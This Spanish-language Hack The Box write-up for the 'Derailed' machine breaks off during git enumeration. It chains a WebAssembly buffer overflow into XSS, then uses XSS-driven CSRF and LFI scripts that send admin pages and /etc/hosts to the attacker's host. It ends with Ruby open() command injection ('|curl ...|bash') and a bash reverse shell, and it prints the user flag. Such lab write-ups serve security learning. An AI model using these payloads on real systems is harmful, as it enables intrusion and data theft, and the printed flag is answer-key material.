---
layout: post
title: Derailed
date: 2023-07-29
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Derailed-htb/Derailed.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.190 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 14:46 GMT
Nmap scan report for 10.10.11.190
Host is up (0.084s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,3000 10.10.11.190 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-29 14:47 GMT
Nmap scan report for 10.10.11.190
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 16:23:b0:9a:de:0e:34:92:cb:2b:18:17:0f:f2:7b:1a (RSA)
|   256 50:44:5e:88:6b:3e:4b:5b:f9:34:1d:ed:e5:2d:91:df (ECDSA)
|_  256 0a:bd:92:23:df:44:02:6f:27:8d:a6:ab:b4:07:78:37 (ED25519)
3000/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: derailed.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.21 seconds
```

Añado ```derailed.htb``` al ```/etc/hosts```

## Puerto 3000 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.190:3000
http://10.10.11.190:3000 [200 OK] Bootstrap, Cookies[_simple_rails_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[_simple_rails_session], IP[10.10.11.190], Script, Title[derailed.htb], UncommonHeaders[x-content-type-options,x-download-options,x-permitted-cross-domain-policies,referrer-policy,link,x-request-id], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/Derailed-htb/1.png" alt="">

En base a la cookie, se puede ver que se emplea ```Ruby on Rails```

```null
curl -s -X GET http://10.10.11.190:3000 -I | grep -i cookie
Set-Cookie: _simple_rails_session=fUWSHGvUSvW2RSwJAFOCXNWjmWpK8A05SHzuKnFOMP%2FpXgpsPuT0i93mMGT7IeN8r32SGhSfbLuuyYcBkj5fj6B7jCveVznDuzREKkaBqgSsh%2FG2hmEHo9zgejWBtX9Hw7XahWhLB2lQe54XLV3zdMnT1lH22XCokhdRyTxjeEpC6aCmZvvcKmbUQiGoB%2BpRWzLD%2BV43FENKKbqcqwAh%2B%2FlQh01azX%2B%2B%2Bd63oa9nVCQORBY6XEgkQSHbEY0hPO%2FkRPGmpGQ9%2BwELNy96s52D0dBZqNr3emqJZ6X0Txg%3D--0qTprfbZ6eZMnfSd--amcLKhIyL0hccT0SWkCQ8g%3D%3D; path=/; HttpOnly; SameSite=Lax
```

Puedo registrarme

<img src="/writeups/assets/img/Derailed-htb/2.png" alt="">

Pruebo una inyección XSS en el texto de la nota, pero no se acontece. Aparece el nombre de usuario en la parte superior. Recargo la página y desde las herramientas de desarrolador, encuentro un archivo ```display.wasm``` que llama la atención

<img src="/writeups/assets/img/Derailed-htb/3.png" alt="">

Lo descargo para analizarlo, pero es un archivo compilado y no es legible

```null
wget 10.10.11.190:3000/js/display.wasm
ile display.wasm
display.wasm: WebAssembly (wasm) binary module version 0x1 (MVP)
```

Sin embargo, desde el ```Debbuger``` del navegador, puedo verlo en texto claro. Introduzco un breakpoint en la función 2

<img src="/writeups/assets/img/Derailed-htb/4.png" alt="">

Obtengo el valor dos variables en UTF-8

<img src="/writeups/assets/img/Derailed-htb/5.png" alt="">

Hago el proceso inverso para ver el texto. Corresponde a la fecha y nombre de usuario

<img src="/writeups/assets/img/Derailed-htb/6.png" alt="">

Al estarse definiendo un tamaño a la constante, es probable que se pueda producir un buffer overflow que permita la inyección de etiquetas HTML no deseadas. Con python creo una string de 128 caracteres para registrarme con ese nombre

```null
python3 -c 'print("A"*128)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Es necesario interceptar la petición con ```BurpSuite```, de lo contrario lo acorta a 40

```null
POST /register HTTP/1.1
Host: derailed.htb:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://derailed.htb:3000/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 190
Origin: http://derailed.htb:3000
DNT: 1
Connection: close
Cookie: _simple_rails_session=YnHKcMXsu26st7cD2v68wHnFhuK3uSdxC8pe2kW7oSz0fCQmFHB0YTTfhM%2FWglD55W9BpUlZEkNHa9sDV4GbcYxJ6VSumN2Eh82XR24urQA8H4BBySQiuPyBJ4zd41b1SD3JCjuYn2fkvGbFbCrvxtCbIJ4HoXN0xkbNIjkwxhunJY9vFzCc1FIDgH9bjEJHBLzKC6ZOBsfLIp%2FPvdahgv8Q%2FARCo75xTmOTjz4PytOvEgm%2BgrweZU3SfvXOErhgTaAePV2aCMp28eMIEVfFup0%2FM6fgpIKjwgsdoWo%3D--WhDtlHwtK7IfEz56--kxjcdL0nNsSU5bEXikG83A%3D%3D
Upgrade-Insecure-Requests: 1

authenticity_token=y9-xAsj9W0ZvETP7Pe93QN8xxxzfQn14eUbfIX6oGx-itaCGB-kkbibilRyXm4XN5hnr4MOYWZCrJ_OjVQZ8Zg&user%5Busername%5D=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&user%5Bpassword%5D=test123&user%5Bpassword_confirmation%5D=test123
```

Al crear una nueva nota, aparece sobrescrita la sección de la fecha

<img src="/writeups/assets/img/Derailed-htb/7.png" alt="">

El XSS no se acontecía en el nombre de usuario, pero puede que sí en la fecha. Creo un patrón para encontrar el offset

```null
pattern_create.rb -l 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

Me quedo con los 8 primeros bytes el cálculo

<img src="/writeups/assets/img/Derailed-htb/8.png" alt="">

```null
pattern_offset.rb -q Ab6A
[*] Exact match at offset 48
```

Creo un payload que muestre por pantalla un mensaje

```null
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <img src=x onerror=alert('1');>
```

Se interpreta correctamente

<img src="/writeups/assets/img/Derailed-htb/9.png" alt="">

Lo modifico para que cargue un recurso JS alojado en mi equipo

```null
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <img src=x onerror=import('http://10.10.16.69/pwned.js');>
```

Recibo la petición en mi equipo

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.16.69 - - [29/Jul/2023 16:08:08] code 404, message File not found
10.10.16.69 - - [29/Jul/2023 16:08:08] "GET /pwned.js HTTP/1.1" 404 -
```

Pero al recargar la página, aparece una advertencia sobre el CORS

<img src="/writeups/assets/img/Derailed-htb/10.png" alt="">

Es necesario añadir la cabecera ```Access-Control-Allow-Origin```. Creo un script en python para que al crear el servicio la asigne a todos los clientes

```py
from http.server import SimpleHTTPRequestHandler, HTTPServer

class MyHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        SimpleHTTPRequestHandler.end_headers(self)

server = HTTPServer(('0.0.0.0', 80), MyHandler)
server.serve_forever()
```

A modo de prueba, tramito una petición por GET al localhost y me aseguro que la cabecera está setteada

```null
curl -s -X GET localhost -I
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.4
Date: Sat, 29 Jul 2023 16:17:40 GMT
Content-type: text/html; charset=utf-8
Content-Length: 408
Access-Control-Allow-Origin: *
```

Mediante fuzzing, encuentro la ruta ```/report```

```null
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt http://derailed.htb:3000/FUZZ/121
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://derailed.htb:3000/FUZZ/121
Total requests: 26584

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000103:   200        151 L    391 W      5561 Ch     "report" 
```

<img src="/writeups/assets/img/Derailed-htb/11.png" alt="">

Comparto el enlace de mi nota y me llega la petición

```null
10.10.11.190 - - [29/Jul/2023 16:27:04] code 404, message File not found
10.10.11.190 - - [29/Jul/2023 16:27:04] "GET /pwned.js HTTP/1.1" 404 -
```

No puedo obtener su cookie de sesión ya que el ```HttpOnly``` está activado

<img src="/writeups/assets/img/Derailed-htb/12.png" alt="">

Aplico fuzzing pero esta vez desde la raíz

```null
gobuster dir -u http://derailed.htb:3000/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://derailed.htb:3000/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/07/29 16:29:33 Starting gobuster in directory enumeration mode
===============================================================
/logout               (Status: 302) [Size: 91] [--> http://derailed.htb:3000/]
/login                (Status: 200) [Size: 5592]                              
/register             (Status: 200) [Size: 5908]                              
/404                  (Status: 200) [Size: 1722]                              
/administration       (Status: 302) [Size: 96] [--> http://derailed.htb:3000/login]
/500                  (Status: 200) [Size: 1635]                                   
/422                  (Status: 200) [Size: 1705]                                   
                                                                                   
===============================================================
2023/07/29 16:31:40 Finished
===============================================================
```

Puedo intentar derivar el XSS a un CSRF para así obtener el código fuente de ```/administration```

```js
var req1 = new XMLHttpRequest();
req1.open('GET', 'http://derailed.htb:3000/administration', false);
req1.withCredentials = true;
req1.send();

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.16.69/?data=' + btoa(req1.responseText), false);
req2.send();
```

Recibo la data

```null
python3 server.py
10.10.11.190 - - [29/Jul/2023 16:40:29] "GET /pwned.js HTTP/1.1" 200 -
10.10.11.190 - - [29/Jul/2023 16:40:30] "GET /?data=PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8dGl0bGU+ZGVyYWlsZWQuaHRiPC90aXRsZT4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSI+CiAgPG1ldGEgY2hhcnNldD0idXRmLTgiLz4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iLz4KCiAgPG1ldGEgbmFtZT0iY3NyZi1wYXJhbSIgY29udGVudD0iYXV0aGVudGljaXR5X3Rva2VuIiAvPgo8bWV0YSBuYW1lPSJjc3JmLXRva2VuIiBjb250ZW50PSJXYWNzeC1ZNXFyckR6OFJjS25JU2NyRDR6SEJ5RlZ1Y2s5Vy10cldSd1JtRGhfeGJrLXZwbGFYUWoxcjlZSzRCTWRDdjhLV0JyT3BOYWZvNDRlQllfZyIgLz4KICAKCiAgPCEtLSBXYXJuaW5nICEhIGVuc3VyZSB0aGF0ICJzdHlsZXNoZWV0X3BhY2tfdGFnIiBpcyB1c2VkLCBsaW5lIGJlbG93IC0tPgogIAogIDxzY3JpcHQgc3JjPSIvcGFja3MvanMvYXBwbGljYXRpb24tMTM1YjVjZmEyZGY4MTdkMDhmMTQuanMiIGRhdGEtdHVyYm9saW5rcy10cmFjaz0icmVsb2FkIj48L3NjcmlwdD4KCiAgPGxpbmsgaHJlZj0iL2pzL3ZzL2VkaXRvci9lZGl0b3IubWFpbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIvPgogIDwhLS0gRmF2aWNvbi0tPgogIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSIvYXNzZXRzL2Zhdmljb24uaWNvIi8+CiAgPCEtLSBGb250IEF3ZXNvbWUgaWNvbnMgKGZyZWUgdmVyc2lvbiktLT4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly91c2UuZm9udGF3ZXNvbWUuY29tL3JlbGVhc2VzL3Y2LjEuMC9qcy9hbGwuanMiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0PgogIDwhLS0gR29vZ2xlIGZvbnRzLS0+CiAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PU1vbnRzZXJyYXQ6NDAwLDcwMCIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIvPgogIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1MYXRvOjQwMCw3MDAsNDAwaXRhbGljLDcwMGl0YWxpYyIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIvPgogIDwhLS0gQ29yZSB0aGVtZSBDU1MgKGluY2x1ZGVzIEJvb3RzdHJhcCktLT4KICA8bGluayBocmVmPSIvY3NzL3N0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIvPgo8L2hlYWQ+Cjxib2R5IGlkPSJwYWdlLXRvcCI+CjwhLS0gTmF2aWdhdGlvbi0tPgo8bmF2IGNsYXNzPSJuYXZiYXIgbmF2YmFyLWV4cGFuZC1sZyBiZy1zZWNvbmRhcnkgdGV4dC11cHBlcmNhc2UgZml4ZWQtdG9wIiBpZD0ibWFpbk5hdiI+CiAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgIDxhIGNsYXNzPSJuYXZiYXItYnJhbmQiIGhyZWY9Ii8iPkNMSVBOT1RFUzwvYT4KICAgIDxidXR0b24gY2xhc3M9Im5hdmJhci10b2dnbGVyIHRleHQtdXBwZXJjYXNlIGZvbnQtd2VpZ2h0LWJvbGQgYmctcHJpbWFyeSB0ZXh0LXdoaXRlIHJvdW5kZWQiIHR5cGU9ImJ1dHRvbiIgZGF0YS1icy10b2dnbGU9ImNvbGxhcHNlIiBkYXRhLWJzLXRhcmdldD0iI25hdmJhclJlc3BvbnNpdmUiIGFyaWEtY29udHJvbHM9Im5hdmJhclJlc3BvbnNpdmUiIGFyaWEtZXhwYW5kZWQ9ImZhbHNlIiBhcmlhLWxhYmVsPSJUb2dnbGUgbmF2aWdhdGlvbiI+CiAgICAgIE1lbnUKICAgICAgPGkgY2xhc3M9ImZhcyBmYS1iYXJzIj48L2k+CiAgICA8L2J1dHRvbj4KICAgIDxkaXYgY2xhc3M9ImNvbGxhcHNlIG5hdmJhci1jb2xsYXBzZSIgaWQ9Im5hdmJhclJlc3BvbnNpdmUiPgogICAgICA8dWwgY2xhc3M9Im5hdmJhci1uYXYgbXMtYXV0byI+CgoKCiAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gbXgtMCBteC1sZy0xIj4KICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsgcHktMyBweC0wIHB4LWxnLTMgcm91bmRlZCIgaHJlZj0iL2FkbWluaXN0cmF0aW9uIj5BZG1pbmlzdHJhdGlvbjwvYT4KICAgICAgICAgICAgPC9saT4KCgogICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSBteC0wIG14LWxnLTEiPgogICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsgcHktMyBweC0wIHB4LWxnLTMgcm91bmRlZCIgaHJlZj0iL2xvZ291dCI+TG9nb3V0PC9hPgogICAgICAgICAgPC9saT4KCgogICAgICA8L3VsPgogICAgPC9kaXY+CiAgPC9kaXY+CjwvbmF2PgoKPGhlYWRlciBjbGFzcz0ibWFzdGhlYWQiPgoKICAKCgogIDxzdHlsZT4KICAgICAgYnV0dG9uIHsKICAgICAgICAgIGJhY2tncm91bmQ6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgICAgIHBhZGRpbmc6IDAgIWltcG9ydGFudDsKICAgICAgICAgIGZvbnQtZmFtaWx5OiBhcmlhbCwgc2Fucy1zZXJpZjsKICAgICAgICAgIGNvbG9yOiAjMDY5OwogICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7CiAgICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgICBtYXJnaW4tbGVmdDogMzBweDsKICAgICAgfQogIDwvc3R5bGU+CgoKICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgoKICAgIDxoMz5SZXBvcnRzPC9oMz4KCgoKCiAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIvYWRtaW5pc3RyYXRpb24vcmVwb3J0cyI+CgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImF1dGhlbnRpY2l0eV90b2tlbiIgaWQ9ImF1dGhlbnRpY2l0eV90b2tlbiIgdmFsdWU9Ik9rWUw0cUFienZuWDE3SnlUSTN4M01xODVtRUZhVG9UV3BiSHV2S2s0M1BnWnR0LTFjbU4xckhJLVhTYm4wMnZTNVNGNGRMOXpXV0VLb00wcHRWNmxBIiBhdXRvY29tcGxldGU9Im9mZiIgLz4KCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIG5hbWU9InJlcG9ydF9sb2ciIHZhbHVlPSJyZXBvcnRfMjlfMDdfMjAyMy5sb2ciIGhpZGRlbj4KCiAgICAgICAgPGxhYmVsIGNsYXNzPSJwdC00Ij4gMjkuMDcuMjAyMzwvbGFiZWw+CgogICAgICAgIDxidXR0b24gbmFtZT0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiPgogICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1kb3dubG9hZCBtZS0yIj48L2k+CiAgICAgICAgICBEb3dubG9hZAogICAgICAgIDwvYnV0dG9uPgoKCiAgICAgIDwvZm9ybT4KCgoKCgoKICA8L2Rpdj4KCjwvaGVhZGVyPgoKCjwhLS0gRm9vdGVyLS0+Cjxmb290ZXIgY2xhc3M9ImZvb3RlciB0ZXh0LWNlbnRlciI+CiAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgIDwhLS0gRm9vdGVyIExvY2F0aW9uLS0+CiAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy00IG1iLTUgbWItbGctMCI+CiAgICAgICAgPGg0IGNsYXNzPSJ0ZXh0LXVwcGVyY2FzZSBtYi00Ij5Mb2NhdGlvbjwvaDQ+CiAgICAgICAgPHAgY2xhc3M9ImxlYWQgbWItMCI+CiAgICAgICAgICAyMjE1IEpvaG4gRGFuaWVsIERyaXZlCiAgICAgICAgICA8YnIvPgogICAgICAgICAgQ2xhcmssIE1PIDY1MjQzCiAgICAgICAgPC9wPgogICAgICA8L2Rpdj4KICAgICAgPCEtLSBGb290ZXIgU29jaWFsIEljb25zLS0+CiAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy00IG1iLTUgbWItbGctMCI+CiAgICAgICAgPGg0IGNsYXNzPSJ0ZXh0LXVwcGVyY2FzZSBtYi00Ij48YSBocmVmPSJodHRwOi8vZGVyYWlsZWQuaHRiIj5kZXJhaWxlZC5odGI8L2E+PC9oND4KICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IGJ0bi1zb2NpYWwgbXgtMSIgaHJlZj0iIyEiPjxpIGNsYXNzPSJmYWIgZmEtZncgZmEtZmFjZWJvb2stZiI+PC9pPjwvYT4KICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IGJ0bi1zb2NpYWwgbXgtMSIgaHJlZj0iIyEiPjxpIGNsYXNzPSJmYWIgZmEtZncgZmEtdHdpdHRlciI+PC9pPjwvYT4KICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1vdXRsaW5lLWxpZ2h0IGJ0bi1zb2NpYWwgbXgtMSIgaHJlZj0iIyEiPjxpIGNsYXNzPSJmYWIgZmEtZncgZmEtbGlua2VkaW4taW4iPjwvaT48L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1saWdodCBidG4tc29jaWFsIG14LTEiIGhyZWY9IiMhIj48aSBjbGFzcz0iZmFiIGZhLWZ3IGZhLWRyaWJiYmxlIj48L2k+PC9hPgogICAgICA8L2Rpdj4KICAgICAgPCEtLSBGb290ZXIgQWJvdXQgVGV4dC0tPgogICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCI+CiAgICAgICAgPGg0IGNsYXNzPSJ0ZXh0LXVwcGVyY2FzZSBtYi00Ij5BYm91dCBkZXJhaWxlZC5odGI8L2g0PgogICAgICAgIDxwIGNsYXNzPSJsZWFkIG1iLTAiPgogICAgICAgICAgZGVyYWlsZWQuaHRiIGlzIGEgZnJlZSB0byB1c2Ugc2VydmljZSwgd2hpY2ggYWxsb3dzIHVzZXJzIHRvIGNyZWF0ZSBub3RlcyB3aXRoaW4gYSBmZXcgc2Vjb25kcy4KICAgICAgICA8L3A+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgPC9kaXY+CjwvZm9vdGVyPgo8IS0tIENvcHlyaWdodCBTZWN0aW9uLS0+CjxkaXYgY2xhc3M9ImNvcHlyaWdodCBweS00IHRleHQtY2VudGVyIHRleHQtd2hpdGUiPgogIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+PHNtYWxsPkNvcHlyaWdodCAmY29weTsgZGVyYWlsZWQuaHRiIDIwMjI8L3NtYWxsPjwvZGl2Pgo8L2Rpdj4KCjwhLS0gQm9vdHN0cmFwIGNvcmUgSlMtLT4KPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vYm9vdHN0cmFwQDUuMS4zL2Rpc3QvanMvYm9vdHN0cmFwLmJ1bmRsZS5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iL2pzL3NjcmlwdHMuanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uc3RhcnRib290c3RyYXAuY29tL3NiLWZvcm1zLWxhdGVzdC5qcyI+PC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPgo= HTTP/1.1" 200 -
```

La introduzco en un archivo ```administration.html``` haciendole el decode para abrilo desde el navegador

<img src="/writeups/assets/img/Derailed-htb/13.png" alt="">

Se puede ver un botón de descarga para un reporte. Esto tramita una petición por POST para descargar un archivo LOG. Se utiliza un token para validar la autenticidad de la sesión

<img src="/writeups/assets/img/Derailed-htb/14.png" alt="">

Es vulnerable a LFI, puedo leer archivos internos como el ```/etc/hosts```

```js
const req1 = new XMLHttpRequest();
const url1 = 'http://derailed.htb:3000/administration';

req1.onreadystatechange = function() {
  if (req1.readyState === 4 && req1.status === 200) {
    const html = req1.responseText;
    const page = new DOMParser().parseFromString(html, 'text/html');
    const token = page.getElementById('authenticity_token').value;

    const req2 = new XMLHttpRequest();
    const url2 = 'http://derailed.htb:3000/administration/reports';
    const params = 'authenticity_token=' + encodeURIComponent(token) + '&report_log=/etc/hosts';

    req2.onreadystatechange = function() {
      if (req2.readyState === 4 && req2.status === 200) {
        const responseHtml = req2.responseText;

        const req3 = new XMLHttpRequest();
        const url3 = 'http://10.10.16.69:9001/';

        req3.onreadystatechange = function() {
          if (req3.readyState === 4 && req3.status === 200) {
          }
        };

        req3.open('POST', url3, true);
        req3.send(responseHtml);
      }
    };

    req2.open('POST', url2, true);
    req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    req2.send(params);
  }
};

req1.open('GET', url1, true);
req1.send();
```

```null
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.16.69] from (UNKNOWN) [10.10.11.190] 47272
POST / HTTP/1.1
Host: 10.10.16.69:9001
Connection: keep-alive
Content-Length: 52
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/96.0.4664.45 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://derailed.htb:3000
Referer: http://derailed.htb:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

127.0.0.1 localhost
127.0.0.1 derailed derailed.htb
```

En este [artículo](https://devblast.com/r/modular-rails/the-core-module%3A-admin-panel) configuran los archivos de administración de ```Ruby on Rails```. Uno de ellos, ```admin_controller.db``` puede servirme para ver como está estructurado el servicio. Como desconozco la ruta donde está instalado, utilizo ```/proc/self/cwd``` que corresponde a la ruta del directorio actual de trabajo, por lo que la ruta final sería ```/proc/self/cwd/app/controllers/admin_controller.rb```

```null
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.16.69] from (UNKNOWN) [10.10.11.190] 42202
POST / HTTP/1.1
Host: 10.10.16.69:9001
Connection: keep-alive
Content-Length: 752
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/96.0.4664.45 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://derailed.htb:3000
Referer: http://derailed.htb:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

class AdminController < ApplicationController
  def index
    if !is_admin?
      flash[:error] = "You must be an admin to access this section"
      redirect_to :login
    end

    @report_file = helpers.get_report_file()

    @files = Dir.glob("report*log")
    p @files
  end

  def create
    if !is_admin?
      flash[:error] = "You must be an admin to access this section"
      redirect_to :login
    end

    report_log = params[:report_log]

    begin
      file = open(report_log)
      @content = ""
      while line = file.gets
        @content += line
      end
      send_data @content, :filename => File.basename(report_log)
    rescue
      redirect_to request.referrer, flash: { error: "The report was not found." }
    end

  end
end
```

Se está empleando la función ```open``` para abrir el archivo. Al no estar sanitizada es vulnerable a RCE. Para saber como funciona, lee este [artículo](https://bishopfox.com/blog/ruby-vulnerabilities-exploits). El payload sería el siguiente:

```null
&report_log=|curl 10.10.16.69|bash
```

Previamente he creado un archivo ```index.html``` que se encarga de enviarme una reverse shell

```null
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.69/443 0>&1'
```

Gano acceso al sistema como el usuario ```rails```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.69] from (UNKNOWN) [10.10.11.190] 43524
bash: cannot set terminal process group (805): Inappropriate ioctl for device
bash: no job control in this shell
rails@derailed:/var/www/rails-app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
rails@derailed:/var/www/rails-app$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
rails@derailed:/var/www/rails-app$ export TERM=xterm-color
rails@derailed:/var/www/rails-app$ stty rows 55 columns 209
rails@derailed:/var/www/rails-app$ source ~/.bashrc 
```

Puedo ver la primera flag

```null
rails@derailed:~$ cat user.txt 
bdd2eed157d98dd010c8856aa5df0d34
```

# Escalada

El directorio ```/var/www/rails-app``` es un repositorio GIT

```null
rails@derailed:/var/www/rails-app$ ls -la | grep git
drwxrwxr-x   8 rails rails   4096 Nov  4  2022 .git
-rw-rw-r--   1 rails rails    327 May 25  2022 .gitattributes
-rw-rw-r--   1 rails rails    840 May 25  2022 .gitignore
```

Tiene varios commit

```null
rails@derailed:/var/www/rails-app$ git log
commit 5ef649cc9b81893b070c607bdca5e6ed4370b914 (HEAD -> master)
Author: gituser <gituser@local>
Date:   Sat May 28 15:01:14 2022 +0200

    init

commit 61995bf40dcb332b8979adc32152d73e5546e40c
Author: gituser <gituser@local>
